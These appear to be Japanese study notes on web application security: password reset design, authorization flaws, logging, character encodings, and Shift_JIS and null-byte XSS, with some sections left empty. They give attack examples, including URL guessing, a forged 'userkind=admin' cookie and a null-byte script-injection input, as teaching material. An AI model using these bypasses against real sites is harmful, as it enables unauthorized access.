◎　パスワードリマインダ
　利用者がパスワードを忘れた場合に、なんらかの方法でパスワードを知らせる仕組みを用意する場合がある。
　パスワードリマインダ　➡　本人確認後に現在のパスワードを教えるもの。
　パスワードリセット　　➡　パスワードを変更したものを教えるか、パスワード変更を利用者自身にさせるもの。
　パスワードリマインダには管理者向けと利用者向けがあり、管理者向けは必須だが、利用者向けはサイトの性質により検討する。
 
・管理者向けパスワードリマインダ
　利用者がパスワードを忘れた際に管理者に問い合わせて対処してもらう場合があり、この対処に必要である。
　パスワードを表示させると管理者による悪用が懸念されるため、実際にはパスワード再設定の機能（パスワードリセット）として実装する。
　1．問合わせを受け付け、利用者の本人確認を行う
　2．管理者がパスワードをリセットし、利用者に仮パスワードを伝える
　3．利用者は仮パスワードでログインし、直ちにパスワードを変更する
　パスワードをリセットして本人に伝える際は以下の理由で管理用アプリケーションからリセット後のパスワードを直接メールで送信するのがよい。
　1．管理者やヘルプデスク担当がパスワードを見ないため、悪用の心配がない。
　2．本人を装ったなりすましの電話であっても、パスワードを知られるリスクが減らせる
　いずれにしてもリセット後は利用者本人がパスワードを変更するべきである。
　仮パスワード　➡　自分のパスワード変更だけができるパスワードで、パスワード変更してからでないと他の権限がない。
　管理者向けパスワードリセット機能の要件
　・本人確認の際に照合する情報表示機能（本人確認は電話か書面など）
　・仮パスワード発行機能（仮パスワードは画面表示せずにメールで利用者に送信）
　・仮パスワードではパスワードの変更のみが可能
 
・利用者向けパスワードリマインダ
　パスワードを忘れた利用者本人がパスワードを調べる、もしくはリセットするための機能。

　・本人確認の方法
　　通常以下の両方あるいは片方が用いられる。
  　・ユーザー登録時に「秘密の質問と答え」を登録してもらい、パスワードリマインダを使う場合に秘密の質問に答えてもらう
  　・登録されたメールアドレスのメールを受け取れることで本人確認する
  　これらはいずれもなりすましのリスクがある。
  　秘密の質問には第三者が知り得る情報を使いやすい、メールは平文のため送信を盗聴されるリスクがある。
   
　・パスワードの通知方法
　　A．現在のパスワードをメールで通知
　　B．パスワード変更画面のURLをメールで通知
　　C．仮パスワードを発行してメールで通知（メールアドレスは入力させる）
　　D．パスワード変更画面に直接遷移（メールアドレスは入力させる）
　　本書ではCかDを推奨。
　　・A　➡　パスワードを適切に暗号化していないという不安を利用者に与えること、メール盗聴での不正利用の可能性があること。
　　・B　➡　メールに添付されたURLを参照するという習慣を利用者に身に付けさせること。
　　・C　➡　メール盗聴のリスクはあるが、仮パスワードを使って第三者がパスワードを変更した場合、
　　　　　　 利用者にパスワード変更の通知がいくため、すぐに対処できる点が優れている。
　　　　　　 ただし、利用者が指定したメールアドレスが登録されていない場合でも秘密の質問は表示させ、
　　　　　　 メールアドレスが登録されているかされていないかを判断させないようにする必要がある。
　　　　　　 この場合はダミーの質問をいくつか用意しておき、未登録のアドレスの場合はダミーの質問をして必ず誤答とする。
　　　　　　 また、同一のメールアドレスに対するダミーの質問は毎回同じにする。
　　・D　➡　実装上の注意点は、入力されたメールアドレスが登録されていない場合でもエラーにはせず、確認番号の入力画面を表示すること。
  　　　　　 Cと同様にメールアドレスの登録の有無を判断させないためである。
        　　また、確認番号（トークン）に対する総当たり攻撃を防止するために、確認番号の間違いや連続するパスワードリセットの回数制限を設け、
　　　　　　 超過した場合はアカウントをロックする。ただし、ロックしても画面には表示せずにメール通知を行い、ヘルプデスクに誘導する。
       

◎　アカウントの停止
　特定のアカウントに対してセキュリティ上の問題が生じた場合は、アカウントを一時的に停止する場合がある。例を以下に示す。
　1．利用者本人からの依頼（PCを盗まれた、スマホを落とした、心当たりのないパスワード変更通知を受け取ったなど）
　2．不正アクセスを受けている場合
　アカウントの停止および最有効化機能は管理者向け機能として実装する。
　

◎　アカウントの削除
　通常取消できない処理のため、本人の意思確認とCSRF対策を目的としてパスワードの再確認（再認証）を要求する。
 

-----------------------------------------------------------------------------------------------------------

★　認可

◎　認可とは
　認可　➡　認証された利用者に対して権限を与えること。権限の例を以下に示す。
　・認証された利用者のみに許可された機能
 　　➡　退会処理、送金（振込）、新規ユーザー作成（管理者として）など
　・認証された利用者のみに許可された情報の閲覧
 　　➡　非公開の利用者自身の個人情報、非公開の他利用者の利用者個人情報（管理者として）、非公開の掲示板の内容、Webメールなど
  ・認証された利用者のみに許可された編集操作
 　　➡　利用者本人の設定変更（パスワード、プロフィール、画面設定など）、他利用者の設定変更（管理者として）、Webメールからのメール送信など
  
  
◎　認可不備の典型例
・情報リソースのIDを変更すると権限外の情報が参照できる
　URLなどのパラメータに情報を特定するIDを指定することは通常用いられる実装だが、
　リソースIDを変更するだけで権限を与えられていない情報を閲覧あるいは変更できる場合がある。
　リソースIDをPOSTパラメータ（hiddenパラメータ）やクッキーに保持している場合にも同じ問題が発生する。
　リソースIDには取引番号、文書番号、メールのメッセージ番号などがある。

・メニューの表示・非表示のみで制御している
　管理者メニューに一般機能と管理者機能のリンクが表示されている。
　一般ユーザーとしてログインした場合は一般機能しかないが、ファイル名から類推してURLを変更することで管理者機能を実行される可能性がある。
　このケースは権限外のメニューURLを知っている必要があり、知る方法の例は以下である。
　1．メニューのアルファベットや数値をずらす
　2．adminやroot、manageなど管理者メニューに使われやすい単語を試す
　3．もともと権限のあった人がURLを記憶しておき、権限がなくなった後に管理者メニューを実行する
 
・hiddenパラメータやクッキーに権限情報を保持している　
　認可制御不備の3番目の例はhiddenパラメータやクッキーに権限情報を保持しているケース。
　例えばクッキーにuserkind=adminと指定すれば管理者機能が使えるようになるサイト。
 
参考：秘密情報を埋め込んだURLによる認可処理
　認証やセッション管理を使わずに認可処理を実装するための手法として、URLに秘密情報を埋め込むことでURLを知らない人がアクセスできない仕組みを作る場合がある。
　URLに秘密情報を埋め込む手法
　1．URL上にファイル名を十分長いランダムな文字列にする
　2．URLにトークンを埋め込む
　3．URLにアクセスチケットを埋め込む
　いずれもURLに秘密情報を持つこと自体が好ましくない。
　理由として、秘密情報の送信にはPOSTメソッドを用いるという原則に違反しており、以下のようなリスクがあるためだ。
　・RefererによるURLの漏洩
　・利用者自身が掲示板などでURLを公開してしまう
　・秘密のURLが検索エンジンに登録される
　やむを得ずこの方法を採用する場合は、アクセス可能な時間を極力短くした上でURLを公開してはならないことを利用者に注意喚起すべきだ。
 

◎　認可制御の要件定義
　認可制御の要件を定義するために権限マトリックスを作成する。
　権限マトリックス　➡　各管理者やユーザーの管理業務における権限を表したもの。
　権限マトリックスの例
　　　　　　　　　　　　　　　　システム管理者　　企業管理者　　一般ユーザー
　企業の追加　　　　　　　　　　　　　〇　　　　　　　×　　　　　　　×
　企業管理者の追加・削除　　　　　　　〇　　　　　　　×　　　　　　　×
　企業内ユーザーの追加・削除　　　　　〇　　　　　　　〇　　　　　　 ×
　自分自身のパスワード変更　　　　　　〇　　　　　　　〇　　　　　　 〇
　他人のパスワード変更　　　　　　　　〇　　　　企業内に限り〇　　　 ×
 
参考：ロール
　ロール　➡　システム管理者、企業管理者、一般ユーザーのような権限を組み合わせて役割を示す名前をつけたもの。
 　　　　　　 ユーザーとは独立して定義して、ロールをユーザーに割り当てるような使い方をする。
　　　　　　　ロールを使わずにadminやrootなどの管理者を示すユーザーを作る方法もあるが、
　　　　　　　・管理者が複数いる場合にどの担当者か後で追跡できなくなる
　　　　　　　・管理者パスワードを複数の担当者が知っている状態になり、事故が起こりやすくなる
　　　　　　　という理由で推奨されない。IDは担当者毎に1つ作成（1人1IDの原則）し、個人IDに対して業務に必要なロールを割り当てる方がよい。

◎　認可制御の正しい実装　
　認可制御の不備の多くは画面の制御のみで認可制御を実装しているつもりになっていることにある。
　正しい認可制御は情報の操作に先立って以下を確認することである。
　1．このスクリプト（画面）を実行してよいユーザーであるか
　2．リソースに対する操作（参照、変更、削除など）の権限はあるか
　ユーザー情報は外部から書き換えのできないセッション変数に保持するのが認証情報保持の原則である。
　・セッション変数に格納したユーザーIDを基準に権限をチェックする
　・権限情報をクッキーやhiddenパラメータなどに保持しない
 

-----------------------------------------------------------------------------------------------------------

★　ログ出力

◎　ログ出力の目的
　アプリケーションのログがセキュリティ上も重要である理由は以下である。
　1．攻撃や事故の予兆をログから把握し、早期に対策するため
　2．攻撃や事故の事後調査のため
　3．アプリケーションの運用監査のため
　攻撃の予兆をログから調べて通常よりも回数が多いログイン試行やログインエラーを観察により外部からの攻撃の可能性がわかる。
　一方で攻撃を受けて被害が出た場合には攻撃の状況の調査にログが必要になる。
 

◎　ログの種類
　1．Webサーバー（Apache、IISなど）のログ
　2．アプリケーションログ
 　　➡　更に　エラーログ、アクセスログ、デバッグログに分類できる。
   ・エラーログ
   　アプリケーションの様々なエラーを記録するもの。
     画面には「アクセスが集中しているのでしばらく待ってからお試しください」というように表示して、エラーの詳しい内容や原因はログに出力する。
     エラー内容を表示することで利用者が困惑すること、攻撃者にヒントになることが理由である。
     SQLインジェクション攻撃やディレクトリトラバーサル攻撃などの試行中はSQLのエラーやファイルオープンのエラーが発生しやすい。
     通常エラーログに発生しないものであるからエラーが続けて起こる場合は攻撃を疑うべきでエラー原因を調べて改善する必要がある。
   ・アクセスログ
   　Webアプリケーションの情報閲覧や機能の利用記録としてのログ。
   　正常でも異常でもログに残す。
   　2004年頃まではそこまで重要視されていなかったが、異常系のログだけでは認識できない事例もあり、正常系のアクセスログが重要視され始めた。
   　先の目的を実現するためにも必要であり、各種の法令やガイドラインでもアクセスログの取得が要求されている。
   ・デバッグログ
   　文字通りデバッグようのログのことである。
   　デバッグログを生成するとデータ量が膨大になり、パフォーマンスに影響が出る場合もある。
   　また個人情報が漏洩した事例もあるため、本番環境ではデバッグログは取得するべきではない。
　3．データベースのログ
 

◎　ログ出力の要件
・ログに記録すべきイベント
　イベントは多すぎても少なすぎてもダメでログの使用目的から決定すべきだが、一般的には以下に示す認証・アカウント管理や重要な情報や操作に関するイベントを記録する。
　1．ログイン・ログアウト（失敗も含む）
　2．アカウントロック
　3．ユーザー登録・削除
　4．パスワード変更
　5．重要情報の参照
　6．重要な操作（物品の購入、送金、メール送信など）
 
・ログの出力項目
　4W1H（いつ、だれが、どこで、なにを、どのように）に沿った項目
　1．アクセス日時
　2．リモートIPアドレス
　3．ユーザーID
　4．アクセス対象（URL、ページ番号、スクリプトIDなど）
　5．操作内容（閲覧、変更、削除など）
　6．操作対象（リソースIDなど）
　7．操作結果（成功あるいは失敗、処理件数など）
 　また、監査などでは複数のログを突き合わせ処理をすることが多いため、ログの出力フォーマットは統一しておく。

・ログの保護
　ログが改竄等されると目的を達成できないため、ログに対する不正アクセスができないように保護する必要がある。
　また、ログファイル自体に個人情報や機密情報が含まれているため、権限を持つもののみが閲覧できるように制限する。
　このため、可能であればログを保存するサーバーはWebサーバーやDBサーバーとは別に用意し、サイト管理者とは別にログの管理者を割り当てることが好ましい。

・ログの出力先
　データベースやファイルがよく用いられるが、ログ専用のサーバーを用意するべきである。

・ログの保管期間
　Webサイトの特性に合わせてログの保管期間を運用ルールとして定める。
　セキュリティ上の事件や事故の事後調査という目的を考慮するとログの保管期間を定めるのは難しく、無期限で保存する考えもある。
　一方でログ自体に機密情報を含む場合があるため、漏洩の危険性が増加するというジレンマもある。
　定期的にDVD-Rなどのメディアに記録し、安全な場所に記録メディアを保管するなど運用を工夫する。

・サーバーの時刻合わせ
　ログは単独で存在するのではなく、Webサーバー、アプリケーション、データベース、メールなど様々なログを組み合わせて調査などに用いる。
　これら複数ログを突き合わせられるように各サーバーの時刻を同期させる必要がある。
　この目的のためにはNTP（Network Time Protocol）というプロトコルを用いて合わせることが多い。


◎　ログ出力の実装
　ログ出力は通常のファイルアクセス機能やデータベースアクセス機能を使っても実装が可能だが、ログ特有の要求を考慮して設計されたログ出力用のライブラリがある。
　代表例がJava向けのログ出力ライブラリのlog4jである。
　log4jは現在Apacheのプロジェクトに組み込まれており、PHP向けのlog4php、マイクロソフトの.NET向けのlog4netなどのシリーズ化がされている。
　メリットは以下である。
　1．ログの出力先が抽象化されていて、設定だけで切り替えが可能
　2．ログの目的によって複数の出力先を切り替えることが可能
　3．ログのフォーマット（レイアウト）を設定ファイルで指定可能
　4．ログレベルを指定でき、ソースを書き換えることなくレベルの変更が可能
　log4jの用意している出力先には以下があり、アプリケーションの改修不要でログを出しわけることが可能である。
　1．ファイル
　2．データベース
　3．メール
　4．syslog
　5．Windowsイベントログ（NTEVENT）
　ログレベルについてはlog4jでは以下のレベルが用意されている（重要度の高い順）。
　1．fatal（回復不可能なエラー）
　2．error（エラー）
　3．warn（警告）
　4．info（情報）
　5．debug（デバッグ用の情報）
　6．trace（デバッグよりも詳細な動作トレース）
　ログレベルの典型的な使い方として、開発時にはdebugレベルを指定して詳しいログ情報を取得しておき、
　本番運用時にはinfoを指定するようにすればソースコードを修正することなくinfo以上の重要度のログのみが取得できる。
 
参考：アクセスログを要求するガイドライン
　政府や各種団体の公開しているセキュリティガイドラインにはアクセスログの取得を義務付けているものがある。
　・個人情報の保護に関する法律（個人情報保護法）
　・金融商品取引法の要求する内部統制報告書
　・Payment Card Industry（PCI)データセキュリティ基準（PCI-DSS）
　　PCI-DSS　➡　クレジットカードの加盟店や決済代行事業者向けのセキュリティ基準で、カード情報や取引情報を保護するための12項目の要件が規定されている。
 

-----------------------------------------------------------------------------------------------------------

★　文字コードとセキュリティ

◎　文字コードとセキュリティの概要
　Webアプリケーションでは文字列の処理が頻繁に出てくる。文字列処理で文字コードの扱いに不備があると、様々なバグの原因になり脆弱性の原因となる場合がある。
　文字コードとは以下の概念を合わせたものと考えられる。
　1．文字集合
　2．文字エンコーディング（文字符号化方式）


◎　文字集合
・文字集合とは
　文字集合　➡　その名の通り文字を集めたもの。
　コンピュータで文字集合を扱う場合は、単に文字を集めただけでは取り扱い上不便なため、各文字に符号（番号）を付けて識別する。
　代表的な文字集合
　文字集合名　　　　　　　ビット長　　　　　対応言語　　　　　　　　説明
　ASCII　　　　　　　　　　 7ビット　　　　　英語　　　　　　　　　規格化された最古の文字集合
　ISO-8859-1　　　　　　　　8ビット　　　　西ヨーロッパ諸語　　　　ASCIIにフランス語やドイツ語などのアクセント付き文字などを追加
　JIS X 0201　　　　　　　　8ビット　　　　英字・片仮名　　　　　　ASCIIと片仮名
　JIS X 0208　　　　　　　　16ビット　　　 日本語　　　　　　　　　第2水準までの漢字
　マイクロソフト標準　　　　 16ビット　　　 日本語　　　　　　　　　JIS X 0201とJIS X 0208に、NECと日本IBMの機種依存文字を追加
　キャラクタセット
　JIS X 0213　　　　　　　　16ビット　　　 日本語　　　　　　　　　第4水準までの漢字
　Unicode　　　　　　　　　 21ビット　　　 多言語　　　　　　　　　世界共通の文字集合
 
・ASCIIとISO-8859-1
　ASCII（American Code for Information Interchange）　
 　➡　1963年に米国で制定された文字集合。7ビットの整数の範囲に、英語圏で使用頻度の高い数字、ローマ字（大文字、小文字）、記号類を納めています。
  　　 ASCII以前の文字集合がベンダー独自に定めたものであるのに対して、ASCIIは初めて公的に規格化された文字集合として画期的で後世に大きな影響を与えた。
　ISO-8859-1
 　➡　ASCIIを8ビットに拡張する形で、英語以外のフランス語やドイツ語など西ヨーロッパ言語の表記に必要なアクセント記号付きのローマ字や、
　　　 追加したもので、通称Latin-1と呼ばれ、現在ではASCIIに代わって広く利用されている。
    
・JISで規定された文字集合
　JIS X 0201　➡　ASCIIを8ビットに拡張することで片仮名及び日本語表記に必要な記号を追加した文字集合。
 　　　　　　　　　ASCIIに共通するコード部分では0x5Cのバックスラッシュ「\」が円記号「¥」、0x7Eのチルダ「~」がオーバーライン「￣」に変更されている。
  JIS X 0208　➡　0201では日本語表記に不可欠な平仮名や漢字が表現できないため、1978年に平仮名、片仮名、漢字などを含む文字集合として規定された。
  　　　　　　　　 ローマ字や数字も含まれるが、ASCIIや0201とは異なる体系で符号化されている。そのため、0208のローマ字や片仮名を
           　　　 「全角ローマ字」、「全角片仮名」と呼び、ASCIIや0201の文字を「半角文字」と呼ぶことで両者を別の文字として扱う。
　JIS X 0213　➡　2000年に0208の上位互換として制定された。漢字が第3水準1259文字、第4水準2436文字増えている。
 
・マイクロソフト標準キャラクタセット　
　マイクロソフト標準キャラクタセット（CP932）
 　➡　マイクロソフト株式会社が1993年にWindows3.1日本語版を出荷する際に、それまでOEMベンダー毎に独自拡張していた文字集合を統合して定めた。
  　　 JIS x 0201と0208に加え、NECおよび日本IBMの拡張文字集合を統合している。
　　　 NEC拡張文字として有名なものは「①」のような丸付き数字、日本IBM拡張漢字の有名なものは「髙」（はしご高）など。
　　　 マイクロソフト標準キャラクタセットの拡張文字の多くが、JIS X0213やUnicodeに取り込まれており、今では標準の文字となっている。

・Unicode
　Unicode　
 　➡　国際的な情報の伝達やソフトウェアを国際化する上で不便なため、コンピュータ関連企業のグループが中心となって制定した文字集合。
　　　 最初の公表は1993年でUnicode6.0は2010年である。
   　　当初16ビットですべての文字を表現する計画だったが、不十分だったため21ビットにまで拡張された。
   　　元々の16ビットで表現できる範囲を基本多言語面（Basic Multilingual Plane:BMP）と呼ぶ。
　　　 Unicodeでは文字の符号をコードポイントと呼びU+XXXX（XXXXは4桁から6桁の16進数）で表す。「表」はU+8868。
   　　UnicodeはASCII、ISO-8859-1、JIS X 0201、0208、0213、マイクロソフト標準キャラクタセットすべて包含している。
 
・異なる文字が同じコードに割り当てられる問題
　文字集合間の文字割り当ての違い
 　文字集合　　　　0x5C　　　0xA5
  　ASCII　　　　　\       　%　　　　
  　JIS X 0201　　¥　　　　　･
  　ISO-8859-1　　\         ¥
  　Unicode       \　　　　 ¥
   
・文字集合の扱いが原因で起こる脆弱性
　処理の順序によってはエスケープが抜けてしまい、脆弱性の原因になる。
   

◎　文字エンコーディング
・文字エンコーディング
　文字集合には符号がついているため、そのままコンピュータ処理に使えばいいようだが、現実はそう単純ではない。
　歴史的にUS-ASCIIやISO-8859-1、JIS X 0201などの1バイト文字集合が先に普及したため、これらとの互換性を保ちつつ、
　0208やUnicodeなどの2バイト以上の文字集合を併用する必要性が生じた。このための符号化を文字エンコーディング、文字符号化方式と呼ぶ。

・Shift_JIS
　Shift_JIS
 　➡　JIS X 0201の空き容量に0208をマッピングする形で作られた。文字集合としてマイクロソフト標準キャラクタセットを用いるため、
  　　 マイクロソフトコードページ932、あるいはCP932と呼ばれる。
    　 2バイト文字の1バイト目（先行バイト）を0x81～0x9Fと0xE0～0xFCに割り当て、2バイト目（後続バイト）には0x40～0x7Eと0x80～0xFCを割り当てる。
       EUC-JPやUTF-8と比べて狭いところに巧妙に文字を詰め込んだ符号化方式となっており、効率よく文字を表現できる。
　
　・文字列マッチングの誤動作
　　Shift_JISの欠点
  　➡　先行バイトと後続バイトの分布が重なっているため、符号化された文字列の1バイトを取り出しても先行か後続か判断できない。
   　　 また、後続バイトの範囲には1バイト文字の特殊記号と重なっている部分があるため、Shift_JISの処理が不完全な場合、後続バイトを特殊記号と誤認することがある。
    5C問題　➡　0x5C「¥」による誤動作。「表」は95と5Cであらわされるが、5Cが「¥」でもあるため、「表」に「¥」がマッチングしてしまう。
    　　　　　　これらはマルチバイトに対応した関数を使えば解決できる。
  
　・不正なShift_JIS
　　Shift_JISとして不正なデータ列を悪用する攻撃手法がある。不正なデータとは以下のようなデータ（バイト列）である。
　　・Shift_JISの先行バイトの後にデータ（バイト）がない状態（例：0x81）
　　・Shift_JISの先行バイトに続くバイトが後続バイトの範囲にない（例：0x81　0x21）
  
　・不正なShift_JISエンコーディングによるXSS
　　0x82がShift_JISの2バイト文字の1文字目を示すため、属性値を示す「"」がShift_JISの2バイト目と認識されることで
　　次の「"」までがvalueの属性値とみなされ、そのあとのJSが実行される。
　　対策としてhtmlspecialchars関数の第3引数に文字エンコーディングを指定することで解消される。
  　　　　　　　　　　　　　
   
-----------------------------------------------------------------------------------------------------------


DNSリバインディング

-----------------------------------------------------------------------------------------------------------

◎　ヌルバイト攻撃

・概要
　ブラウザ上でJavaScriptが実行されて、XSS攻撃をされる。
 　例えば、入力値をチェックするフォームでヌルバイトが正しく処理されない場合、
  　正常値%00<script>悪い処理</script>
   と入れられたら、%00まではチェックして正常値を返し、その後ろがチェックされずに実行されてしまうということが発生する。

・原因
　バイナリセーフな関数を使用していない。
　バイナリセーフ…入力値がどんなバイト列であっても正しく扱えること。特にヌルバイトが現れても正しく処理できる
　ヌルバイト…値ゼロのバイト（PHPでは\0と表記）。特別なのはC言語などではヌルバイトを文字列の終端とみなす取り決めがあるため。
 
・対策




